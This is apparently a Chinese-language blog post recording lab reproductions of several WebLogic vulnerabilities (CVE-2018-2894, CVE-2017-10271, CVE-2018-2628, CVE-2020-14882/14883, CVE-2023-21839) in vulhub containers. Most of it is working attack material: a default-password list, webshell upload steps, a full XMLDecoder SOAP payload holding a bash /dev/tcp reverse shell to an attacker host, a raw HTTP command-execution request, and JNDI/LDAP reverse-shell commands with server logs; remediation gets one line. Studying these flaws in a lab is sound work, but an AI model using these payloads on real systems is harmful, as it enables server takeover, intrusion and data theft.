---
title: Weblogic 漏洞复现
published: 2025-03-20 23:34:24
image: "./image 53.png"
tags: [漏洞复现,WEB安全]
category: 安全
draft: false
---
# Weblogic 漏洞复现

> 做漏洞复现记录，学习常见漏洞利用，面试可用到。参考文章：https://developer.aliyun.com/article/1225910 | https://blog.csdn.net/qq_43593134/article/details/119801840
> 

## Weblogic 弱口令

`http://your-ip:7001/console` 即可进入后台，由于管理员的疏忽，有可能会设置一些弱口令，攻击者可以通过常见的口令猜解进入后台，再通过后台`getshell`

```bash
system:password
weblogic:weblogic
admin:secruity
joe:password
mary:password
system:sercurity
wlcsystem: wlcsystem
weblogic:Oracle@123
```

## 任意文件上传 **CVE-2018-2894**

### 漏洞原理

WebLogic管理端**未授权**的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为`/ws_utc/begin.do`，`/ws_utc/config.do`

影响版本：10.3.6，12.1.3，12.2.1.2，12.2.1.3

### 漏洞复现

使用`vulhub`进行复现

Oracle 7月更新中，修复了`Weblogic Web Service Test Page`中一处任意文件上传漏洞，`Web Service Test Page` 在  生产模式 下默认不开启，所以该漏洞有一定限制，漏洞存在页面在`/ws_utc/config.do`

所以得先对后台做一下设置，首先查看后台密码

```bash
root@sunset-ubuntu:/home/sunset/Desktop/vulhub/weblogic/CVE-2018-2894# docker compose logs | grep password
weblogic-1  |       ----> 'weblogic' admin password: E1jqCts6
weblogic-1  | admin password  : [E1jqCts6]
weblogic-1  | *  password assigned to an admin-level user.  For *
weblogic-1  | *  password assigned to an admin-level user.  For *
```

进入后台，点击`base_domian` - 高级

![image.png](image%2053.png)

开启Web测试页后保存，到这环境配置好了

![image.png](image%2054.png)

访问`/ws_utc/config.do` （未授权访问）

![image.png](image%2055.png)

将当前工作目录改为：

`/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css`

![image.png](image%2056.png)

点击安全后再点击右上角的添加

![image.png](image%2057.png)

开启抓包，然后点击提交，返回中有一时间戳需要用到

![image.png](image%2058.png)

上传后木马地址为：`http://you-ip/ws_utc/css/config/keystore/[时间戳]_[文件名]`

```bash
http://192.168.111.170:7001/ws_utc/css/config/keystore/1742379972165_shell.jsp
```

使用哥斯拉进行连接，成功连接

![image.png](image%2059.png)

![image.png](image%2060.png)

### 漏洞复现 - 工具

![image.png](image%2061.png)

## **XMLDecoder反序列化漏洞 CVE-2017-10271**

### 漏洞原理

`Weblogic`的`WLS Security`组件对外提供`webservice`服务，其中使用了`XMLDecoder`来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令

影响范围：10.3.6.0，12.1.3.0.0，12.2.1.1.0

漏洞地址：

```bash
/wls-wsat/CoordinatorPortType
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/ParticipantPortType
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationRequesterPortType11
```

### 漏洞复现

访问漏洞地址，出现如下可能存在漏洞

![image.png](image%2062.png)

对漏洞页面进行抓包，修改请求方式为`POST`，请求字段改为`Content-Type:text/xml` ，然后添加`POC`

```bash
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/192.168.111.162/1234 0&gt;&amp;1</string> 
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

![image.png](image%2063.png)

发送后能接收到`shell`了

![image.png](image%2064.png)

### 漏洞复现 - 工具

![image.png](image%2065.png)

## **Java 反序列化漏洞 CVE-2018-2628**

### 漏洞原理

攻击者利用其他 `rmi` 绕过`weblogic`黑名单限制，然后在将加载的内容利用`readObject`解析，从而造成反序列化远程代码执行该漏洞，该漏洞主要由于T3服务触发，所有开放`weblogic`控制台`7001`端口，默认会开启T3服务，攻击者发送构造好的T3协议数据，就可以获取目标服务器的权限。

影响范围：10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3

### 漏洞复现

使用`vulhub` 搭建

漏洞验证，直接使用工具了

![image.png](image%2066.png)

![image.png](image%2067.png)

使用`ysoserial.jar` 开启`JRMP`服务

![image.png](image%2068.png)

下载`EXP`进行利用

```bash
 ⚡ root@kali  ~/Desktop/test/test/Weblogic  wget https://www.exploit-db.com/download/44553                                                                                          
 ⚡ root@kali  ~/Desktop/test/test/Weblogic  mv 44553 exp.py      
```

脚本是使用`python2`编写的

```bash
python.exe exp.py <靶机IP> <靶机端口> <ysoserial.jar 的位置> <JRMP服务器IP> <RMP服务器端口>
```

![image.png](image%2069.png)

运行到靶机上看是否存在`/tmp/testfile`文件夹，成功

![image.png](image%2070.png)

反弹`shell`只需要将 `touch /tmp/testfile` 改为反弹shell语句

## 未授权远程命令执行 **CVE-2020-14882，CVE-2020-14883**

### 漏洞原理

`CVE-2020-14882` 和 `CVE-2020-14883`

CVE-2020-14882 允许远程用户绕过管理员控制台组件中的身份验证，而 CVE-2020-14883 允许经过身份验证的用户在管理员控制台组件上执行任何命令。使用这两个漏洞的连锁，未经身份验证的远程攻击者可以通过 HTTP 在 Oracle WebLogic 服务器上执行任意命令并完全控制主机。

影响版本：10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3

### 漏洞复现

访问主页，需要用户凭据

![image.png](image%2071.png)

通过下面的连接可以直接进入后台，未授权访问 `CVE-2020-14882`

```bash
http://192.168.111.170:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29
```

但是通过未授权进入的后台有限制，所以得通过`CVE-2020-14883` 来执行命令

抓包修改添加`POC`

```bash
POST /console/images/%252E%252E%252Fconsole.portal HTTP/1.1
Host: 192.168.111.170:7001
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: close
Cookie: ADMINCONSOLESESSION=J0-zdXvyaJBvGHUL0-IXW1tlfB2mcv_qvAoBgleycpZfEDi0-jjx!-1039244030
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 140

_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/test1.txt');")
```

![image.png](image%2072.png)

查看是否创建成功

![image.png](image%2073.png)

使用脚本来实现攻击：https://github.com/GGyao/CVE-2020-14882_ALL/blob/master/CVE-2020-14882_ALL.py

```bash
⚡ root@kali  ~/Desktop/Tools/exphub/weblogic  python cve-2020-14882_rce.py -u http://192.168.111.170:7001 -c "uname -a"
Linux c54cea89caf2 6.11.0-19-generic #19~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon Feb 17 11:51:52 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

## 远程代码执行 **CVE-2023-21839**

### 漏洞原理

WebLogic 存在远程代码执行漏洞（`CVE-2023-21839`/`CNVD-2023-04389`）

Weblogic IIOP/T3协议存在缺陷，当IIOP/T3协议开启时，允许未经身份验证的攻击者通过IIOP/T3协议网络访问攻击存在安全风险的WebLogic Server，漏洞利用成功WebLogic Server可能被攻击者接管执行任意命令导致服务器沦陷或者造成严重的敏感数据泄露

影响版本：12.2.1.2.0，12.2.1.1.0，12.2.1.3.0，12.2.1.0.0，12.2.1.4.0，14.1.1.0.0，12.1.2.0.0，12.1.3.0.0，10.3.6.0

### 漏洞复现

使用`vulhub`搭建

漏洞探测，使用工具

![image.png](image%2074.png)

![image.png](image%2075.png)

使用`POC`文件进行漏洞探测：https://github.com/DXask88MA/Weblogic-CVE-2023-21839

```bash
java -jar .\Weblogic-CVE-2023-21839.jar 192.168.111.170:7001 ldap://axm0q2.dnslog.cn
```

![image.png](image%2076.png)

进行 getshell

工具：https://github.com/DXask88MA/Weblogic-CVE-2023-21839/releases/tag/CVE-2023-21839

运行`LDAP`服务器

```bash
⚡ root@kali  ~/Desktop/test/test/Weblogic  /usr/local/jdk-9.0.4/bin/java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.111.162                                                                                           
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8080...
```

使用`Weblogic-CVE-2023-21839.jar` 访问`LDAP`服务，并指定`/Basic/ReverseShell`

```bash
java -jar .\Weblogic-CVE-2023-21839.jar 192.168.111.170:7001 ldap://192.168.111.162:1389/Basic/ReverseShell/192.168.111.162/1234
```

运行后`LDAP`服务器有回显

```bash
⚡ root@kali  ~/Desktop/test/test/Weblogic  /usr/local/jdk-9.0.4/bin/java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.111.162                                                                                           
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8080...
[+] Received LDAP Query: Basic/ReverseShell/192.168.111.162/1234
[+] Paylaod: reverseshell
[+] IP: 192.168.111.162
[+] Port: 1234
[+] Sending LDAP ResourceRef result for Basic/ReverseShell/192.168.111.162/1234 with basic remote reference payload
[+] Send LDAP reference result for Basic/ReverseShell/192.168.111.162/1234 redirecting to http://192.168.111.162:8080/ExploitYqDTm7E6g0.class
[+] New HTTP Request From /192.168.111.170:60486  /ExploitYqDTm7E6g0.class
[+] Receive ClassRequest: ExploitYqDTm7E6g0.class
[+] Response Code: 200
```

可以接收到 `shell` 了

![image.png](image%2077.png)

## 如何修复

更新到最新版本

禁用 T3、IIOP协议：https://blog.csdn.net/m0_71692682/article/details/128774311
